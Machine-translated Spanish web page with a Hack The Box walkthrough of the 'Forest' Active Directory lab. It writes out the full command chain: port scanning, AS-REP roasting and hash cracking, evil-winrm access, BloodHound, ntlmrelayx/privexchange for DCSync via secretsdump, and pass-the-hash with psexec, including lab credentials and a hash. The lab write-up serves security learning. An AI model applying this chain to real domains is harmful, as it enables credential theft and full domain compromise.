<!doctype html>
<html class="no-js" lang="es">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👉 ♋️ 🧓🏼 Hack The Box - Tutorial del bosque. AS-REP Asado, DCSync y ataques Pass-The-Hash 🕴🏾 🍅 😜</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Sigo publicando soluciones enviadas para su posterior procesamiento desde el sitio de HackTheBox . Espero que esto ayude al menos a alguien a desarrol...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box - Tutorial del bosque. AS-REP Asado, DCSync y ataques Pass-The-Hash</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/493478/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/hb/tr/98/hbtr98btoexwyz38jz8ch0fjkkk.png" alt="imagen"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sigo publicando soluciones enviadas para su </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">posterior procesamiento</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> desde el sitio de </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Espero que esto ayude al menos a alguien a desarrollarse en el campo de la seguridad de la información. </font><font style="vertical-align: inherit;">En este artículo, trataremos el asado AS-REP en el esquema de autenticación Kerberos, usaremos BloodHound para el reconocimiento de dominio, realizaremos un ataque DCSync PrivExchange y un ataque Pass-The-Hash. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La conexión al laboratorio es a través de VPN. </font><font style="vertical-align: inherit;">Se recomienda no conectarse desde una computadora de trabajo o desde un host donde los datos importantes para usted estén disponibles, ya que ingresa a una red privada con personas que saben algo en el campo de la seguridad de la información :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Información organizacional</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Esta máquina tiene una dirección IP 10.10.10.161, que agrego a / etc / hosts. </font></font><br>
<code>10.10.10.161 forest.htb</code><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primero, escaneamos puertos abiertos. </font><font style="vertical-align: inherit;">Como lleva mucho tiempo escanear todos los puertos con nmap, primero haré esto con masscan. </font><font style="vertical-align: inherit;">Escaneamos todos los puertos TCP y UDP desde la interfaz tun0 a una velocidad de 1000 paquetes por segundo.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/z2/ay/2k/z2ay2kvslyrnctqo05rowzjjp34.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Había muchos puertos abiertos en el host, y decidí asegurarme de que los resultados proporcionados por masscan fueran correctos. </font><font style="vertical-align: inherit;">Para hacer esto, simplemente escanea el estado de los puertos en nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap 10.10.10.161 -p135,636,3269,49676,49665,53,593,49671,9389,49667,5985,49666,389,88,49684,464,3268,49677,47001,139,445,49714</code></pre><br>
<img src="https://habrastorage.org/webt/k6/kx/lp/k6kxlpjjub0ar5feglfjwqnw8ei.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pero nmap confirmó todo. </font><font style="vertical-align: inherit;">A continuación, debe recopilar más información sobre los puertos conocidos por nmap.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A 10.10.10.161 -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001</code></pre><br>
<img src="https://habrastorage.org/webt/dr/9d/eb/dr9debajqi1xhlflvnqexznf2ee.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A continuación, debe obtener tanta información como sea posible del sistema. </font><font style="vertical-align: inherit;">Para esto, usé enum4linux. </font><font style="vertical-align: inherit;">Pero nos dio poca información. </font><font style="vertical-align: inherit;">Grupos, requisitos de contraseña, falta de SMBv1 y recursos compartidos, etc. </font><font style="vertical-align: inherit;">Sin embargo, tenemos una lista de usuarios.</font></font><br>
<br>
<pre><code class="bash hljs">enum4linux -a 10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/ez/s-/a-/ezs-a-woghvvdj1ln_mbnukpfhm.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dado que Kerberos se está ejecutando en el host, debe verificar si existe una cuenta de usuario que tenga el indicador DONT_REQ_PREAUTH establecido en el UAC. Puede obtener más información sobre las banderas UAC y lo que significan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aquí</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . El indicador DONT_REQ_PREAUTH significa que no se requiere autenticación Kerberos para esta cuenta. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primero, averigüe cuáles de las cuentas de usuario están activas. Esto ayudará a incluir el script samrdump con impacket.</font></font><br>
<br>
<pre><code class="bash hljs">impacket-samrdump forest.htb</code></pre><br>
<img src="https://habrastorage.org/webt/hi/e6/bz/hie6bzhv73inp0umhaetbakwb5s.png" alt="imagen"><br>
<br>
<img src="https://habrastorage.org/webt/dg/-n/gv/dg-ngvbdgi9ykyhoyncrko68t_i.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El script muestra primero todos los usuarios y luego información detallada sobre cada uno de ellos. </font><font style="vertical-align: inherit;">De esta manera, puede ver que la cuenta de Administrador está activa y que Invitado no. </font><font style="vertical-align: inherit;">Ahora podemos hacer una lista de usuarios activos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/y5/n_/et/y5n_etusel7xf5ziwp1z3yczcxu.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cuando tenemos una lista de usuarios activos, podemos verificar la disponibilidad de la bandera que necesitamos. </font><font style="vertical-align: inherit;">Podemos hacer esto usando el script GetNPUsers, que también es parte del paquete impacket. </font><font style="vertical-align: inherit;">Especificamos el dominio htb.local, el controlador de dominio 10.10.10.161, el método de autenticación Kerberos (-k), la opción sin contraseña y la lista de usuarios.</font></font><br>
<br>
<pre><code class="bash hljs">GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -k -no-pass -usersfile ADUsers.txt </code></pre><br>
<img src="https://habrastorage.org/webt/hf/hs/ok/hfhsokebytkpia9rd58xen45ugi.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se nos dice que este indicador no está configurado para todos los usuarios excepto svc-alfresco. </font><font style="vertical-align: inherit;">En mi versión de impacket (21-dev), el hash se solicita automáticamente.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Punto de entrada: tostado AS-REP</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Algunas palabras sobre lo que nos devolvieron el hash. </font><font style="vertical-align: inherit;">A continuación se muestra el esquema de autenticación Kerberos. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/vs/3a/ib/vs3aib6d1lag5b-mkuuxistyoic.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como puede ver, en la primera etapa: el cliente envía un mensaje con el ID de usuario al servidor de autenticación AS con la solicitud de servicio en nombre del usuario. </font><font style="vertical-align: inherit;">El AS genera una clave secreta al cifrar la contraseña del usuario que se encuentra en la base de datos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De esta manera podemos desplazarnos por el hash y encontrar la contraseña. </font><font style="vertical-align: inherit;">Este tipo de ataque se llama AS-REP Roasting. </font><font style="vertical-align: inherit;">Guarde el hash en un archivo y encuentre el prototipo.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./rockyou.txt hashes2.txt</code></pre><br>
<img src="https://habrastorage.org/webt/ss/k6/9e/ssk69eytthsr6dfxtheeldntuhw.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y encontramos la contraseña de usuario.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USUARIO</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si vuelve a abrir puertos, puede encontrar un servicio WinRM en funcionamiento (o Windows Remote Management) diseñado para la administración remota. </font><font style="vertical-align: inherit;">Tenemos un nombre de usuario y contraseña, por lo que podemos conectarnos con seguridad. </font><font style="vertical-align: inherit;">Para esto utilizo </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">evil-winrm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jw/iw/kf/jwiwkfl75h-yukol4b7lr5jfpjo.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Entonces tomamos al usuario.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RAÍZ</font></font></h2><br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inteligencia con BloodHound</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora necesitamos aumentar nuestros privilegios. Para mapear las rutas LPE en un dominio, puede usar el programa </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Evil-winrm le permite cargar archivos desde y hacia el host. Subí al host SharpHound, un módulo para recopilar información. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fe/95/ug/fe95ughqobbdwtby5zpxr6apltc.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
También evil-winrm te permite ejecutar scripts de PowerShell. Indicaremos el usuario, la contraseña y también que queremos saber todo lo que sea posible. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8c/ga/-g/8cga-gzy4a3ge7g-beygyg0voia.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Después de ejecutar el script, aparecerá un archivo zip en el directorio actual. Lo descargamos del host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yz/rm/el/yzrmel0cg0xe7buwuli2olplo18.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A continuación, ejecute el DBMS de gráfico neo4j con el que funciona BloodHound.</font></font><br>
<br>
<pre><code class="bash hljs">neo4j console</code></pre><br>
<img src="https://habrastorage.org/webt/wm/ke/pf/wmkepfwkg0l-bn6o3yniceir-pe.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora ejecuta BloodHound. </font><font style="vertical-align: inherit;">Una pantalla en blanco nos encontrará. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gl/kw/hx/glkwhxkprixwilsknm1drmtbbxi.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora solo arrastre y suelte el archivo descargado en él. </font><font style="vertical-align: inherit;">Y vaya a la pestaña Consultas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2h/pl/qx/2hplqxwmjfksk31b5xdqactuz1a.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y decimos que queremos encontrar las rutas más cortas para los administradores de dominio. </font><font style="vertical-align: inherit;">BloodHound creará un gráfico: el camino hacia nuestro progreso constante. </font><font style="vertical-align: inherit;">Al hacer clic en cada nodo de la red, recibiremos información al respecto. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/is/k1/j1/isk1j1t-kzohm6carowrfckpa3g.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por lo tanto, se nos dice que debemos ser miembros del grupo de permisos de Exchange de Windows, porque somos tratados con las cuentas de servicio del grupo privilegiado, y solo así podemos aumentar los privilegios.</font></font><br>
<br>
<pre><code class="bash hljs">net user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/gd/s0/sy/gds0sybjncodwtlk0iw9vyagfbi.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El usuario no está actualmente en este grupo. </font><font style="vertical-align: inherit;">Añádalo y luego verifiquemos los grupos de usuarios.</font></font><br>
<br>
<pre><code class="powershell hljs"><span class="hljs-built_in">Add-ADGroupMember</span> <span class="hljs-string">"Exchange Windows Permissions"</span> svc<span class="hljs-literal">-alfresco</span></code></pre><br>
<img src="https://habrastorage.org/webt/wo/nc/_1/wonc_1wjiqenlgiegyw3w6cbuhq.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Usuario agregado con éxito al grupo. </font><font style="vertical-align: inherit;">Ahora veamos qué nos da esto. </font><font style="vertical-align: inherit;">El grupo de permisos de Windows de Exchange tiene los derechos WriteDACL (derechos para otorgar derechos) al objeto Dominio en Active Directory, lo que permite a cualquier miembro del grupo cambiar los privilegios de dominio, incluidas las operaciones DCSync.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DCSync</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un poco sobre el ataque DCSync. La replicación de Active Directory es el proceso mediante el cual los cambios realizados en uno de los controladores de dominio se sincronizan con el resto de los controladores en el dominio. Al obtener los permisos necesarios, podemos iniciar una solicitud de replicación, que nos permitirá obtener datos almacenados en Active Directory, incluidos los hash de contraseñas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es decir, podemos sincronizar los valores hash de contraseña de los usuarios de Active Directory e iniciar sesión en cualquier servicio utilizando los protocolos NTLM (desarrollado por el protocolo de autenticación de red de Microsoft) o Kerberos. El ataque implica el uso de dos herramientas, privexchange.py y ntlmrelayx.py del paquete impacket. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Primero, ejecute ntlmrelayx en modo de retransmisión LDAP al controlador de dominio con la cuenta svc-alfresco.</font></font><br>
<br>
<pre><code class="bash hljs">ntlmrelayx.py -t ldap://htb.local --escalate-user svc-alfresco</code></pre><br>
<img src="https://habrastorage.org/webt/ks/7h/cd/ks7hcdp2psno63lm-ffqrrdtdyg.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todos los servicios se están ejecutando y están esperando una conexión. </font><font style="vertical-align: inherit;">Ahora usa privex.</font></font><br>
<br>
<pre><code class="bash hljs">python privexchange.py 10.10.10.161 -ah _ip -d htb.local -u svc-alfresco -p s3rvice</code></pre><br>
<img src="https://habrastorage.org/webt/wb/j1/yw/wbj1yw8rduzjd6yapfszi7f7g18.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Y luego volé un montón de errores, hurgando un par de minutos, se decidió no corregirlos. </font><font style="vertical-align: inherit;">Puede seguir el enlace de arriba en el navegador y pasar la autenticación con credenciales de svc-alfresco. </font><font style="vertical-align: inherit;">En la ventana con ntlmrelayx veremos la información de conexión. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/d3/aj/hn/d3ajhnw1rgrfauebnrc5pxgvqqe.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora ejecute el ataque DCSync usando secretsdump.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc</code></pre><br>
<img src="https://habrastorage.org/webt/iy/ma/3c/iyma3ca8u7atdk_kav1cf0qroaq.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Multa. </font><font style="vertical-align: inherit;">Pudimos replicar todas las cuentas.</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ataque de pase de hash</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Este ataque permite que un atacante inicie sesión en un servidor remoto autenticado con el protocolo NTLM o LM. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En los sistemas que utilizan el protocolo de autenticación NTLM, las contraseñas nunca se transmiten en texto claro a través de un canal de comunicación. En cambio, se transfieren al sistema apropiado (como un controlador de dominio) en forma de hashes en la etapa de respuesta en el esquema de autenticación de preguntas y respuestas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Las aplicaciones de Windows solicitan al usuario la contraseña en texto claro y luego llaman a la API (por ejemplo, LsaLogonUser), que traduce la contraseña en un hash LM y un hash NTLM y las pasa durante el proceso de autenticación. El análisis de los protocolos mostró que para una autenticación exitosa no es necesario conocer la contraseña en forma clara, en su lugar, solo se puede usar su hash.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El ataque se basa en una debilidad en la implementación del protocolo de autenticación de red. </font><font style="vertical-align: inherit;">Consiste en el hecho de que los hashes de contraseña se transmiten sin el uso de sal y, por lo tanto, permanecen sin cambios de sesión a sesión (hasta que se cambie la contraseña del usuario). </font><font style="vertical-align: inherit;">En otras palabras, para un atacante, los hashes de contraseñas son equivalentes a las contraseñas mismas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Realiza un ataque con psexec.</font></font><br>
<br>
<pre><code class="bash hljs">psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161</code></pre><br>
<img src="https://habrastorage.org/webt/iz/wl/bf/izwlbfbysatzgxcnwmjxw1of6us.png" alt="imagen"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Estamos en un sistema con plenos derechos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Puedes unirte a nosotros en </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Formemos una comunidad en la que haya personas con conocimientos en muchas áreas de TI, para que siempre podamos ayudarnos mutuamente en cualquier problema de seguridad de la información y TI.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es493452/index.html">Desenfoque de imagen de fondo de la unidad</a></li>
<li><a href="../es493458/index.html">Libera tu Android - Alaverdi</a></li>
<li><a href="../es493462/index.html">Baño ultrasónico. Parte 2</a></li>
<li><a href="../es493468/index.html">No tengas miedo de respirar profundamente</a></li>
<li><a href="../es493470/index.html">Los científicos encuentran nuevos planetas menores fuera de Neptuno</a></li>
<li><a href="../es493480/index.html">Arquitectura para principiantes o por qué no necesita insertar una bandera en el hombre espada</a></li>
<li><a href="../es493482/index.html">Conoce a la tortuga cibernética, la predecesora de Roomba</a></li>
<li><a href="../es493484/index.html">Su C # ya es "funcional", solo déjelo.</a></li>
<li><a href="../es493486/index.html">Las startups automotrices más interesantes 2019-2020</a></li>
<li><a href="../es493488/index.html">Unidad + git = amistad: parte 1 conjunto de caballeros</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>